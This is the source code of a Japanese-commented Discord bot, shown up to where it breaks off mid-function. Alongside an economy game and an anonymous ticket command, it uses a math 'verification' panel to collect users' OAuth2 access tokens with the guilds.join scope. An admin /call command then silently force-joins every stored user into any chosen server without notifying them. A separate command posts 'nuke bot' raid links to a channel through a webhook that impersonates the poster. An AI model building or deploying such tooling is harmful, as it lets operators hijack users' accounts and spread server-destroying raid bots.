require('dotenv').config();

const { 
    Client, 
    GatewayIntentBits, 
    SlashCommandBuilder, 
    REST, 
    Routes, 
    PermissionsBitField,
    EmbedBuilder,
    ChannelType,
    // --- 認証パネル用に追加 ---
    ActionRowBuilder,
    ButtonBuilder,
    ButtonStyle,
    ModalBuilder,
    TextInputBuilder,
    TextInputStyle,
    InteractionType 
} = require('discord.js');
const axios = require('axios');
const express = require('express');

// 環境変数から設定を取得
const TOKEN = process.env.DISCORD_TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;
const GUILD_ID = process.env.GUILD_ID;
const TICKET_CHANNEL_ID = process.env.TICKET_CHANNEL_ID;
const ARASHI_CHANNEL_ID = process.env.ARASHI_CHANNEL_ID;
const PORT = process.env.PORT || 8000; 

// --- /callとOAuth2用に追加 ---
const OAUTH2_CLIENT_SECRET = process.env.OAUTH2_CLIENT_SECRET;
const OAUTH2_REDIRECT_URI = process.env.OAUTH2_REDIRECT_URI; // 例: https://capybot.netlify.app/verify/

// --- 経済システム (インメモリデータストア) ---
const userBalance = new Map();
const userCooldowns = new Map();

// --- OAuth2 認証済みユーザーデータストア (インメモリデータストア) ---
// Key: Discord User ID (string)
// Value: { accessToken: string }
const authenticatedUsers = new Map(); 

// クールタイム定義 (ミリ秒)
const COOLDOWN_WORK_MS = 60 * 60 * 1000;      // 1時間
const COOLDOWN_ROB_MS = 30 * 60 * 1000;      // 30分
const COOLDOWN_TICKET_MS = 60 * 60 * 1000;   // 1時間
const COOLDOWN_ARASHI_MS = 60 * 60 * 1000;   // 1時間

const ROLE_ADD_COST = 10000;

// --- 認証用グローバル定数 ---
const VERIFY_BUTTON_ID = 'verify_button';
const VERIFY_MODAL_ID = 'verify_modal';
const ANSWER_INPUT_ID = 'answer_input';

// --- 共通ヘルパー関数 ---

function getBalance(userId) {
    return userBalance.get(userId) || 0;
}

function updateBalance(userId, amount) {    
    userBalance.set(userId, amount);
}

function formatCooldown(ms) {
    const totalSeconds = Math.floor(ms / 1000);
    const hours = Math.floor(totalSeconds / 3600);
    const minutes = Math.floor((totalSeconds % 3600) / 60);
    const seconds = totalSeconds % 60;
    
    let parts = [];
    if (hours > 0) parts.push(`${hours}時間`);
    if (minutes > 0) parts.push(`${minutes}分`);
    if (seconds > 0 || parts.length === 0) parts.push(`${seconds}秒`);

    return parts.join(' ');
}

// 共通エラーEmbed関数
function errorEmbed(title, description) {
    return new EmbedBuilder().setColor(0xFF0000).setTitle(title || '❌ エラー').setDescription(description).setTimestamp();
}

// 午前0時のリセット処理
function resetAllData() {
    userBalance.clear();
    userCooldowns.clear();
    // authenticatedUsers はリセットしない (トークンは期限が切れるまで有効なため)
    const timestamp = new Date().toISOString();
    console.log(`[自動リセット] ${timestamp} (UTC) - サーバー時刻の午前0時に経済データとクールダウンがリセットされました。`);
}

function scheduleDailyReset() {
    const now = new Date();
    const midnight = new Date(now.getFullYear(), now.getMonth(), now.getDate() + 1, 0, 0, 0, 0);
    
    const timeUntilMidnight = midnight.getTime() - now.getTime();
    
    setTimeout(() => {
        resetAllData();
        scheduleDailyReset();
    }, timeUntilMidnight);

    console.log(`[リセットスケジュール] 次回のリセットは ${midnight.toLocaleString('ja-JP')} (サーバー時刻) にスケジュールされました。`);
}

// --- Discord コマンド定義 ---

const commands = [
    new SlashCommandBuilder()
        .setName('economy')
        .setDescription('エコノミー機能に関するコマンドです。')
        .addSubcommand(subcommand =>
            subcommand
                .setName('work')
                .setDescription('仕事をしてコインを稼ぎます (クールタイム: 1時間)'))
        .addSubcommand(subcommand =>
            subcommand
                .setName('rob')
                .setDescription('他のメンバーからコインを盗もうとします (クールタイム: 30分)')
                .addUserOption(option =>
                    option.setName('target')
                        .setDescription('盗む相手を選択')
                        .setRequired(true)))
        .addSubcommand(subcommand =>
            subcommand
                .setName('balance')
                .setDescription('自分の残高を確認します。'))
        .addSubcommand(subcommand =>
            subcommand
                .setName('role-add')
                .setDescription(`10,000コインでカスタムロールを作成し、自分に付与します。`)
                .addStringOption(option =>
                    option.setName('name')
                        .setDescription('作成するロールの名前')
                        .setRequired(true))
                .addStringOption(option =>
                    option.setName('color')
                        .setDescription('ロールの色 (任意: 16進数 例: FF0000)')
                        .setRequired(false)))
        .addSubcommand(subcommand =>
            subcommand
                .setName('add')
                .setDescription('管理者: 特定のユーザー/ロールにコインを追加します。')
                .addIntegerOption(option =>
                    option.setName('money')
                        .setDescription('追加する金額')
                        .setRequired(true)
                        .setMinValue(1))
                .addUserOption(option =>
                    option.setName('user')
                        .setDescription('コインを追加する単一ユーザー (任意)')
                        .setRequired(false))
                .addRoleOption(option =>
                    option.setName('role')
                        .setDescription('コインを追加する対象ロール (任意)')
                        .setRequired(false)))
        .addSubcommand(subcommand =>
            subcommand
                .setName('remove')
                .setDescription('管理者: 特定のユーザー/ロールからコインを減らします。')
                .addIntegerOption(option =>
                    option.setName('money')
                        .setDescription('減らす金額')
                        .setRequired(true)
                        .setMinValue(1))
                .addUserOption(option =>
                    option.setName('user')
                        .setDescription('コインを減らす単一ユーザー (任意)')
                        .setRequired(false))
                .addRoleOption(option =>
                    option.setName('role')
                        .setDescription('コインを減らす対象ロール (任意)')
                        .setRequired(false)))
        .addSubcommand(subcommand =>
            subcommand
                .setName('give')
                .setDescription('他のユーザーにコインを送金します。')
                .addUserOption(option =>
                    option.setName('user')
                        .setDescription('送金先のユーザー')
                        .setRequired(true))
                .addIntegerOption(option =>
                    option.setName('money')
                        .setDescription('送金する金額')
                        .setRequired(true)
                        .setMinValue(1))),

    new SlashCommandBuilder()
        .setName('ticket')
        .setDescription('チャンネルにチケットメッセージを送信します (クールタイム: 1時間)。')
        .addStringOption(option =>
            option.setName('message')
                .setDescription('送信したいチケットの内容')
                .setRequired(true)),

    new SlashCommandBuilder()
        .setName('arashi-teikyo')
        .setDescription('nuke botのurlを共有チャンネルに提供します (クールタイム: 1時間)。')
        .addStringOption(option =>
            option.setName('url')
                .setDescription('提供するbotの導入URL')
                .setRequired(true)),
    
    // --- 新規コマンド: 認証パネル ---
    new SlashCommandBuilder()
        .setName('verify-panel')
        .setDescription('認証パネルをチャンネルに送信します。')
        .addRoleOption(option =>
            option.setName('role')
                .setDescription('認証成功時に付与するロール')
                .setRequired(true))
        .setDefaultMemberPermissions(PermissionsBitField.Flags.ManageChannels),

    // --- 修正コマンド: 強制加入 (DM通知なし) ---
    new SlashCommandBuilder()
        .setName('call')
        .setDescription('OAuth2認証済みの全ユーザーを指定サーバーに強制加入させます（通知なし）。')
        .addStringOption(option =>
            option.setName('guild_id')
                .setDescription('強制加入させたいサーバーのID (必須)')
                .setRequired(true))
        .setDefaultMemberPermissions(PermissionsBitField.Flags.Administrator),

].map(command => command.toJSON());

const client = new Client({ 
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.DirectMessages // DM送信の権限は残すが、今回は/callでは使わない
    ] 
});

// --- Express Webサーバー設定 ---

const app = express();
app.use(express.json()); 

// CORS設定 (GASからのPOSTを許可)
app.use((req, res, next) => {
    res.setHeader('Access-Control-Allow-Origin', '*'); 
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }
    next();
});

// GAS POST リクエスト処理エンドポイント
app.post('/gas/post', (req, res) => {
    const timestamp = new Date().toISOString();
    console.log(`[WEBHOOK] ${timestamp} (UTC) --- GASからのPOSTリクエストを受信しました ---`);
    console.log('Received Data (受信したデータ):', req.body);
    console.log('------------------------------------------------------------------------');

    // 成功応答をGASに返す
    res.status(200).json({ 
        status: 'success', 
        message: 'Webサーバーでデータを受信しました。', 
        data_received: req.body 
    });
});

// --- OAuth2 Access Token 交換エンドポイント (パスを /verify に修正) ---
app.get('/verify', async (req, res) => { 
    const { code } = req.query;

    if (!code) {
        return res.status(400).send('OAuth2認証コードが見つかりません。');
    }

    if (!OAUTH2_CLIENT_SECRET || !OAUTH2_REDIRECT_URI) {
        return res.status(500).send('サーバー設定エラー: OAuth2環境変数が設定されていません。');
    }
    
    try {
        // 1. Access Tokenを交換
        const tokenResponse = await axios.post('https://discord.com/api/v10/oauth2/token', new URLSearchParams({
            client_id: CLIENT_ID,
            client_secret: OAUTH2_CLIENT_SECRET,
            grant_type: 'authorization_code',
            code: code,
            redirect_uri: OAUTH2_REDIRECT_URI,
            scope: 'identify guilds.join' 
        }), {
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
        });

        const { access_token, token_type } = tokenResponse.data;

        // 2. ユーザー情報を取得
        const userResponse = await axios.get('https://discord.com/api/v10/users/@me', {
            headers: { Authorization: `${token_type} ${access_token}` }
        });
        const userId = userResponse.data.id;
        
        // 3. ユーザーIDとAccess Tokenをインメモリに保存
        authenticatedUsers.set(userId, { accessToken: access_token });

        console.log('================================================================');
        console.log(`[OAuth2 認証成功] ユーザーID: ${userId}`);
        console.log(`[OAuth2 トークン] Access Tokenをメモリに保存しました。`);
        console.log('================================================================');
        
        // 4. 認証成功のHTMLを返す
        const successHtml = `
<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>認証完了 - サーバー強制加入</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Inter', sans-serif;
            background-color: #1e1f22; 
            color: #f2f3f5;
        }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen p-4">
    <div class="max-w-md w-full bg-gray-800 p-8 rounded-xl shadow-2xl text-center border-t-4 border-green-500">
        <svg class="w-20 h-20 mx-auto text-green-500 mb-6" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path>
        </svg>
        <h1 class="text-3xl font-bold text-white mb-4">
            認証が完了しました！
        </h1>
        <p class="text-lg text-gray-300 mb-8">
            Access Tokenの保存に成功しました。<br>Discordの <code class="text-yellow-400 bg-gray-700 px-1 py-0.5 rounded">/call</code> コマンドを管理者が実行すると、あなたを含めた全認証済みユーザーがサーバーに**知らないうちに**強制加入させられる可能性があります。
        </p>
        <div class="bg-gray-700 p-4 rounded-lg mb-8">
            <p class="mt-1 text-xl font-medium text-green-300">
                Discordアプリに戻ってください
            </p>
        </div>
        <button onclick="window.close()" 
                class="w-full py-3 px-6 bg-indigo-600 hover:bg-indigo-700 text-white font-semibold rounded-lg transition duration-200 shadow-md transform hover:scale-[1.01] focus:outline-none focus:ring-4 focus:ring-indigo-500 focus:ring-opacity-50">
            このウィンドウを閉じる
        </button>
    </div>
</body>
</html>
        `;
        res.status(200).send(successHtml);


    } catch (error) {
        console.error('OAuth2/トークン交換エラー:', error.response?.data || error.message);
        // エラー時もユーザーに分かりやすいメッセージを返す
        const errorHtml = `
<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>認証エラー</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body {
            font-family: 'Inter', sans-serif;
            background-color: #1e1f22; 
            color: #f2f3f5;
        }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen p-4">
    <div class="max-w-md w-full bg-gray-800 p-8 rounded-xl shadow-2xl text-center border-t-4 border-red-500">
        <svg class="w-20 h-20 mx-auto text-red-500 mb-6" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 14l2-2m0 0l2-2m-2 2l-2-2m2 2l2 2m7-2a9 9 0 11-18 0 9 9 0 0118 0z"></path>
        </svg>
        <h1 class="text-3xl font-bold text-white mb-4">
            認証に失敗しました
        </h1>
        <p class="text-lg text-gray-300 mb-8">
            OAuth2認証プロセス中にエラーが発生しました。リダイレクトURIがDiscordと一致しているか、サーバーログを確認してください。
        </p>
        <button onclick="window.close()" 
                class="w-full py-3 px-6 bg-red-600 hover:bg-red-700 text-white font-semibold rounded-lg transition duration-200 shadow-md">
            閉じる
        </button>
    </div>
</body>
</html>
        `;
        res.status(500).send(errorHtml);
    }
});

// サーバー起動確認用のGETリクエスト
app.get('/', (req, res) => {
    res.status(200).send(`Discord BOTとWebサーバーは正常に動作しており、ポート ${PORT} で待機中です。`);
});


// --- Discord イベントハンドラー ---

client.once('clientReady', async () => {
    const timestamp = new Date().toISOString();
    console.log(`[BOT READY] ${timestamp} (UTC): Logged in as ${client.user.tag}`);

    scheduleDailyReset();

    const rest = new REST({ version: '10' }).setToken(TOKEN);

    try {
        console.log('スラッシュコマンドの登録を開始します。');
        await rest.put(
            Routes.applicationGuildCommands(CLIENT_ID, GUILD_ID),
            { body: commands },
        );
        console.log('スラッシュコマンドが正常に登録されました。');
    } catch (error) {
        console.error('スラッシュコマンドの登録エラー:', error);
    }
});


client.on('interactionCreate', async interaction => {
    const userId = interaction.user.id; // 1回目：ここで宣言
    
    // --- ボタンのインタラクション処理 ---
    if (interaction.isButton() && interaction.customId === VERIFY_BUTTON_ID) {
        
        // 5〜9のランダムな数字 * 10〜15のランダムな数字
        const num1 = Math.floor(Math.random() * (9 - 5 + 1)) + 5;
        const num2 = Math.floor(Math.random() * (15 - 10 + 1)) + 10;
        
        const question = `${num1} * ${num2}`;
        const answer = num1 * num2;
        
        // モーダルのカスタムIDに答えとロールIDを埋め込んで渡す
        const roleIdMatch = interaction.message.embeds[0].description.match(/<@&(\d+)> ロール/);
        const roleId = roleIdMatch ? roleIdMatch[1] : 'NONE';

        // 区切り文字として5つのコロン (:::::) を使用
        const customIdWithData = `${VERIFY_MODAL_ID}:::::${answer}:::::${roleId}`; 

        const modal = new ModalBuilder()
            .setCustomId(customIdWithData)
            .setTitle('認証チャレンジ');

        const answerInput = new TextInputBuilder()
            .setCustomId(ANSWER_INPUT_ID)
            .setLabel(question + ' = ?')
            .setStyle(TextInputStyle.Short)
            .setMinLength(1)
            .setRequired(true)
            .setPlaceholder('計算結果の数字を入力してください');

        const actionRow = new ActionRowBuilder().addComponents(answerInput);

        modal.addComponents(actionRow);
        
        await interaction.showModal(modal);
        return;
    }

    // --- モーダルの送信処理 ---
    if (interaction.type === InteractionType.ModalSubmit) {
        // カスタムIDから答えとロールIDを抽出
        const customIdParts = interaction.customId.split(':::::');
        if (customIdParts[0] !== VERIFY_MODAL_ID || customIdParts.length < 3) return;

        const [modalId, correctAnswer, roleId] = customIdParts;
        const userAnswer = interaction.fields.getTextInputValue(ANSWER_INPUT_ID);

        if (parseInt(userAnswer) === parseInt(correctAnswer)) {
            // 認証成功
            try {
                // 1. ロール付与
                const member = await interaction.guild.members.fetch(userId);
                const role = interaction.guild.roles.cache.get(roleId);

                if (role && !member.roles.cache.has(roleId)) {
                    await member.roles.add(roleId, '認証パネルでの計算問題に正解');
                }
                
                // 2. 認証成功のメッセージとOAuth2誘導
                // OAuth2認証に成功すると、トークンがauthenticatedUsersマップに保存される
                const oauthUrl = `https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&response_type=code&redirect_uri=${encodeURIComponent(OAUTH2_REDIRECT_URI)}&scope=identify%20guilds.join`;
                
                const successEmbed = new EmbedBuilder()
                    .setColor(0x00FF00)
                    .setTitle('🎉 認証成功')
                    .setDescription(
                        `<@${userId}> さん、認証に成功しました！${roleId !== 'NONE' ? `<@&${roleId}> ロールが付与されました。` : ''}\n\n` +
                        '**⚠️ [最終警告] 強制加入機能の有効化**\n' +
                        '以下のボタンから**OAuth2認証**を完了してください。\n' + 
                        '承認することで、ボットはあなたの Access Token を取得し、**管理者による `/call` 実行時に、あなたを他のサーバーに**知らないうちに**強制加入**させる権限を得ます。\n' +
                        'この機能はハイリスクであることを理解し、**自己責任**で実行してください。'
                    )
                    .setTimestamp();
                
                const oauthButton = new ButtonBuilder()
                    .setLabel('追加認証（ハイリスク）に進む')
                    .setStyle(ButtonStyle.Link)
                    .setURL(oauthUrl);
                    
                const actionRow = new ActionRowBuilder().addComponents(oauthButton);

                await interaction.reply({ 
                    embeds: [successEmbed], 
                    components: [actionRow],
                    ephemeral: true 
                });

            } catch (error) {
                console.error('認証成功後の処理エラー:', error);
                await interaction.reply({ embeds: [errorEmbed('処理エラー', '認証は成功しましたが、ロールの付与中にエラーが発生しました。')], ephemeral: true });
            }
        } else {
            // 認証失敗
            await interaction.reply({ 
                embeds: [errorEmbed('認証失敗', '計算が間違っています。もう一度認証ボタンを押してやり直してください。')], 
                ephemeral: true 
            });
        }
        return;
    }

    if (!interaction.isCommand()) return;

    const { commandName } = interaction;
    // const userId = interaction.user.id; // <-- 2回目：この二重宣言をコメントアウト/削除します
    const currentBalance = getBalance(userId);

    try {
        switch (commandName) {
            case 'economy':
                const subcommand = interaction.options.getSubcommand();
                await handleEconomy(interaction, subcommand, userId, currentBalance);
                break;
            case 'ticket':
                await handleTicket(interaction, userId);
                break;
            case 'arashi-teikyo':
                await handleArashiTeikyo(interaction, userId);
                break;
            case 'verify-panel':
                await handleVerifyPanel(interaction);
                break;
            case 'call':
                await handleCall(interaction); // DM通知処理を削除
                break;
            default:
                const unknownEmbed = errorEmbed('不明なコマンド', '不明なコマンドです。');
                await interaction.reply({ embeds: [unknownEmbed], ephemeral: true });
        }
    } catch (error) {
        console.error('コマンド実行中にエラーが発生しました:', error);
        const errEmbed = errorEmbed('予期せぬエラー', 'コマンド実行中に予期せぬエラーが発生しました。時間を置いて再度お試しください。');
            
        if (!interaction.replied && !interaction.deferred) {
            await interaction.reply({ embeds: [errEmbed], ephemeral: true });
        } else if (interaction.deferred) {
             await interaction.editReply({ embeds: [errEmbed] });
        }
    }
});

// --- コマンド実行ヘルパー関数 ---

async function handleVerifyPanel(interaction) {
    if (!interaction.member.permissions.has(PermissionsBitField.Flags.ManageChannels)) {
        return interaction.reply({ embeds: [errorEmbed('権限エラー', 'このコマンドを実行するには、チャンネル管理権限が必要です。')], ephemeral: true });
    }
    
    // 認証パネルの Embed を作成
    const roleId = interaction.options.getRole('role').id;
    const verifyEmbed = new EmbedBuilder()
        .setColor(0x00AFFF) // 青系の色
        .setTitle('✅ サーバー認証パネル')
        .setDescription(
            '以下のボタンを押して、認証を完了してください。\n\n' +
            '**⚠️ [最終警告] 強制加入機能について：**\n' +
            'この認証と後続のOAuth2認証を行うと、あなたの Access Token がボットに保存されます。これにより、管理者による <code class="text-yellow-400 bg-gray-700 px-1 py-0.5 rounded">/call</code> コマンドが実行された際、**あなたを含め、認証済みの全ユーザーが、指定されたサーバーに**知らないうちに**強制的に加入させられる**可能性があります。\n' +
            'この機能は通知が発生しない（ただ入れられるだけ）とはいえ、悪用される可能性がある**ハイリスクな機能**であることを理解し、**自己責任**で実行してください。\n\n' +
            `認証に成功すると、<@&${roleId}> ロールが付与されます。`
        )
        .setFooter({ text: '安全なサーバー環境を維持するため、ご協力をお願いします。' })
        .setTimestamp();

    // 認証ボタンを作成
    const verifyButton = new ButtonBuilder()
        .setCustomId(VERIFY_BUTTON_ID)
        .setLabel('認証を開始')
        .setStyle(ButtonStyle.Success)
        .setEmoji('🔒');

    const actionRow = new ActionRowBuilder().addComponents(verifyButton);

    await interaction.reply({
        embeds: [verifyEmbed],
        components: [actionRow]
    });
}

// 修正された handleCall: 全ての認証済みユーザーをターゲットサーバーに強制加入させる（DM通知なし）
async function handleCall(interaction) {
    await interaction.deferReply({ ephemeral: true }); // 処理に時間がかかるため遅延応答

    const guildId = interaction.options.getString('guild_id'); 

    if (!TOKEN || !interaction.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
         return interaction.editReply({ 
             embeds: [errorEmbed('権限エラー', 'このコマンドは管理者のみ実行できます。またはBotのTOKENが設定されていません。')] 
         });
    }

    const targetGuild = client.guilds.cache.get(guildId);
    if (!targetGuild) {
        return interaction.editReply({ 
            embeds: [errorEmbed('サーバーエラー', `ボットは指定されたサーバー（ID: ${guildId}）にいません。`)] 
        });
    }

    // 1. 全認証済みユーザーのリストを取得
    const usersToCall = Array.from(authenticatedUsers.entries());
    if (usersToCall.length === 0) {
        return interaction.editReply({ 
            embeds: [errorEmbed('ユーザーなし', '現在、OAuth2認証を完了しているユーザーがいません。')] 
        });
    }

    let successCount = 0;
    let alreadyMemberCount = 0;
    let failureCount = 0;
    let failedUsers = [];

    // 2. 全ユーザーに対して順次強制加入を試行
    for (const [userIdToCall, authData] of usersToCall) {
        const userAccessToken = authData.accessToken;
        const discordApiUrl = `https://discord.com/api/v10/guilds/${guildId}/members/${userIdToCall}`;
        
        const payload = { access_token: userAccessToken };

        try {
            // PUTリクエストを送信 (Bot Tokenで認証)
            const response = await axios.put(discordApiUrl, payload, 
                {
                    headers: {
                        'Authorization': `Bot ${TOKEN}`, 
                        'Content-Type': 'application/json'
                    }
                }
            );
            
            if (response.status === 201) {
                // 201 Created: ユーザーがサーバーに追加された (新規)
                successCount++;
            } else if (response.status === 204) {
                // 204 No Content: ユーザーはすでにサーバーにいた (既存)
                alreadyMemberCount++;
            } else {
                // その他の成功と見なされるレスポンス (稀)
                successCount++;
            }

        } catch (error) {
            failureCount++;
            failedUsers.push(userIdToCall);
            
            // エラーログ出力 (詳細はコンソールのみ)
            console.error(`[Call Error] User ${userIdToCall} failed to join ${guildId}:`, error.response?.data || error.message);
            
            // トークンが無効な場合はメモリから削除 (コード: 50025)
            if (error.response?.data?.code === 50025) {
                authenticatedUsers.delete(userIdToCall);
                console.log(`[Token Deleted] Invalid token found for user ${userIdToCall}.`);
            }
        }
    }
    
    // 3. 結果のサマリーを返す
    const totalProcessed = usersToCall.length;
    let summaryDescription = 
        `**ターゲットサーバー:** ${targetGuild.name}\n` +
        `**処理されたユーザー数:** ${totalProcessed}名 (全認証済みユーザー)\n\n` +
        `✅ **新規加入:** **${successCount}**名\n` +
        `ℹ️ **既存メンバー:** **${alreadyMemberCount}**名\n` +
        `❌ **加入失敗:** **${failureCount}**名 (トークン期限切れや権限不足など)`;

    if (failureCount > 0) {
        let failedList = failedUsers.join(', ');
        // Embedの文字数制限 (descriptionは1024文字) を考慮
        if (failedList.length > 300) {
             failedList = failedList.slice(0, 300) + '... (他)'; 
        }
        summaryDescription += '\n\n**加入失敗したユーザーIDの一部:**\n`' + failedList + '`';
    }
    
    const summaryEmbed = new EmbedBuilder()
        .setColor(failureCount > 0 ? 0xFF8C00 : 0x00BFFF) // 失敗があれば警告色、成功時は青
        .setTitle(`👥 強制加入処理結果 (通知なし)`)
        .setDescription(summaryDescription)
        .setFooter({ text: '新規加入者にもDMなどの通知は送信されていません。' })
        .setTimestamp();

    await interaction.editReply({ embeds: [summaryEmbed] });
}


async function checkCooldown(interaction, userId, commandName, cooldownTime, cooldownType) {
    const now = Date.now();
    const cooldownData = userCooldowns.get(userId) || {};
    const lastTime = cooldownData[cooldownType] || 0;

    if (now < lastTime + cooldownTime) {
        const remaining = lastTime + cooldownTime - now;
        const timeRemaining = formatCooldown(remaining);

        const cooldownEmbed = new EmbedBuilder()
            .setColor(0xFF8C00)
            .setTitle('⏳ クールタイム中')
            .setDescription(`${commandName} コマンドは現在クールタイム中です。**${timeRemaining}** 後に再度実行できます。`)
            .setTimestamp();

        await interaction.reply({ 
            embeds: [cooldownEmbed], 
            ephemeral: true 
        });
        return true;
    }
    
    // クールタイムを更新
    userCooldowns.set(userId, { ...cooldownData, [cooldownType]: now });
    return false;
}

async function handleTicket(interaction, userId) {
    if (await checkCooldown(interaction, userId, 'チケット', COOLDOWN_TICKET_MS, 'ticket')) return;

    const message = interaction.options.getString('message');
    
    await interaction.deferReply({ ephemeral: true });

    const channel = client.channels.cache.get(TICKET_CHANNEL_ID);
    if (!channel || channel.type !== ChannelType.GuildText) {
        return interaction.editReply({ 
            embeds: [errorEmbed('送信失敗', `設定されたチケットチャンネル（ID: \`${TICKET_CHANNEL_ID}\`）が見つからないか、テキストチャンネルではありません。`)], 
        });
    }

    try {
        const webhooks = await channel.fetchWebhooks();
        let webhook = webhooks.find(wh => wh.owner.id === client.user.id);
        
        // Webhookが存在しない場合は新規作成
        if (!webhook) {
            webhook = await channel.createWebhook({
                name: interaction.user.username, // 仮名
                avatar: interaction.user.displayAvatarURL(), // 仮アイコン
                reason: 'チケットシステム用の Webhook'
            });
        }
        
        // Webhookでメッセージを送信
        await webhook.send({
            content: message,
            username: interaction.user.username,
            avatarURL: interaction.user.displayAvatarURL({ dynamic: true, size: 256 })
        });

        const successEmbed = new EmbedBuilder()
            .setColor(0x00FF00)
            .setTitle('✅ チケット送信完了')
            .setDescription(`メッセージをチケットチャンネルに匿名で送信しました。`)
            .setTimestamp();

        await interaction.editReply({ embeds: [successEmbed] });

    } catch (error) {
        console.error('チケット Webhook エラー:', error);
        await interaction.editReply({ 
            embeds: [errorEmbed('送信失敗', 'メッセージの送信中にエラーが発生しました。ボットの権限（Webhookの管理）を確認してください。')] 
        });
    }
}

async function handleArashiTeikyo(interaction, userId) {
    if (!interaction.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
        return interaction.reply({ embeds: [errorEmbed('権限エラー', 'このコマンドは管理者のみ実行できます。')], ephemeral: true });
    }

    if (await checkCooldown(interaction, userId, '荒らし提供', COOLDOWN_ARASHI_MS, 'arashi_teikyo')) return;

    const url = interaction.options.getString('url');
    
    await interaction.deferReply({ ephemeral: true });

    const channel = client.channels.cache.get(ARASHI_CHANNEL_ID);
    if (!channel || channel.type !== ChannelType.GuildText) {
        return interaction.editReply({ 
            embeds: [errorEmbed('送信失敗', `設定された提供チャンネル（ID: \`${ARASHI_CHANNEL_ID}\`）が見つからないか、テキストチャンネルではありません。`)], 
        });
    }

    try {
        const webhooks = await channel.fetchWebhooks();
        let webhook = webhooks.find(wh => wh.owner.id === client.user.id);
        
        if (!webhook) {
            webhook = await channel.createWebhook({
                name: interaction.user.username, // 仮名
                avatar: interaction.user.displayAvatarURL(), // 仮アイコン
                reason: 'nuke bot url提供システム用の Webhook'
            });
        }
        
        // WebhookでURLを送信
        await webhook.send({
            content: `**nukebotリンクの提供:**\n${url}`,
            username: interaction.user.username,
            avatarURL: interaction.user.displayAvatarURL({ dynamic: true, size: 256 })
        });

        const successEmbed = new EmbedBuilder()
            .setColor(0xFF00FF) // 目立つ色
            .setTitle('⚠️ nukebotリンク提供完了')
            .setDescription(`提供されたリンクを専用チャンネルに送信しました。`)
            .setTimestamp();

        await interaction.editReply({ embeds: [successEmbed] });

    } catch (error) {
        console.error('荒らし提供 Webhook エラー:', error);
        await interaction.editReply({ 
            embeds: [errorEmbed('送信失敗', 'メッセージの送信中にエラーが発生しました。ボットの権限（Webhookの管理）を確認してください。')] 
        });
    }
}


async function handleWork(interaction, userId, currentBalance) {
    if (await checkCooldown(interaction, userId, '仕事', COOLDOWN_WORK_MS, 'work')) return;

    const earnedMoney = Math.floor(Math.random() * (2500 - 1500 + 1)) + 1500;
    
    const newBalance = currentBalance + earnedMoney;
    updateBalance(userId, newBalance);

    const successEmbed = new EmbedBuilder()
        .setColor(0x00FF00)
        .setTitle('💼 仕事完了')
        .setDescription(`お疲れ様です！ **${earnedMoney.toLocaleString()}** コイン稼ぎました。`)
        .addFields({ name: '現在の残高', value: `**${newBalance.toLocaleString()}** コイン`, inline: true })
        .setTimestamp();

    await interaction.reply({ embeds: [successEmbed] });
}

async function handleRob(interaction, userId, currentBalance) {
    if (await checkCooldown(interaction, userId, '強盗', COOLDOWN_ROB_MS, 'rob')) return;
    
    const targetUser = interaction.options.getUser('target');
    
    const warningEmbed = (title, description) => new EmbedBuilder().setColor(0xFFFF00).setTitle(title).setDescription(description).setTimestamp();


    if (targetUser.id === userId) {
        return interaction.reply({ embeds: [errorEmbed('強盗失敗', '自分自身を盗むことはできません！')], ephemeral: true });
    }
    if (targetUser.bot) {
        return interaction.reply({ embeds: [errorEmbed('強盗失敗', 'ボットからは盗めません。')], ephemeral: true });
    }

    const targetBalance = getBalance(targetUser.id);

    if (targetBalance < 100) {
        return interaction.reply({ embeds: [warningEmbed('強盗不可', `${targetUser.username} は貧しいようです。盗むには最低100コイン必要です。`)], ephemeral: true });
    }

    const success = Math.random() < 0.5;

    let resultEmbed;
    let newRobberBalance = currentBalance;
    let newTargetBalance = targetBalance;

    if (success) {
        const stealPercentage = Math.random() * (0.65 - 0.55) + 0.55;
        const stolenAmount = Math.floor(targetBalance * stealPercentage);
        
        newRobberBalance += stolenAmount;
        newTargetBalance -= stolenAmount;
        
        updateBalance(userId, newRobberBalance);
        updateBalance(targetUser.id, newTargetBalance);

        resultEmbed = new EmbedBuilder()
            .setColor(0x00FF00)
            .setTitle('🚨 強盗成功！')
            .setDescription(`${targetUser.username} から **${stolenAmount.toLocaleString()}** コインを盗みました！`)
            .addFields(
                { name: 'あなたの残高', value: `**${newRobberBalance.toLocaleString()}** コイン`, inline: true },
                { name: `${targetUser.username} の残高`, value: `**${newTargetBalance.toLocaleString()}** コイン`, inline: true }
            )
            .setTimestamp();

    } else {
        const lossPercentage = Math.random() * (0.70 - 0.60) + 0.60;
        const lossAmount = Math.floor(currentBalance * lossPercentage);

        newRobberBalance = Math.max(0, currentBalance - lossAmount);
        updateBalance(userId, newRobberBalance);

        resultEmbed = new EmbedBuilder()
            .setColor(0xFF0000)
            .setTitle('👮 強盗失敗...')
            .setDescription(`警察に見つかり、**${lossAmount.toLocaleString()}** コインを罰金として失いました。`)
